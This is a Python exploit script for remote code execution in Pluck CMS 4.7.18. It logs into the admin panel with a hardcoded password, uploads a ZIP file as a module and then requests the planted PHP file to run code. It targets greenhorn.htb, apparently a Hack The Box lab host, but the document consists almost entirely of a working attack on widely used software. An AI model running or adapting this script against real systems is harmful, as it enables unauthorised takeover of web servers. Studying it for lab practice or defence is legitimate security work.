#Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
#Application: pluck
#Version: 4.7.18
#Bugs:  RCE
#Technology: PHP
#Vendor URL: https://github.com/pluck-cms/pluck
#Software Link: https://github.com/pluck-cms/pluck
#Date of found: 10-07-2023
#Author: Mirabbas Ağalarov
#Tested on: Linux 


import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "admin","bogus": "","submit": "Log in"}

file_path = input("ZIP file path: ")

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("mirabbas.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("Login account")

 
    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)

    print(upload_response.text) 
    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)


rce_url="http://greenhorn.htb/data/modules/mirabbas/miri.php"
print(rce_url)
rce=requests.get(rce_url)

print(rce.text)
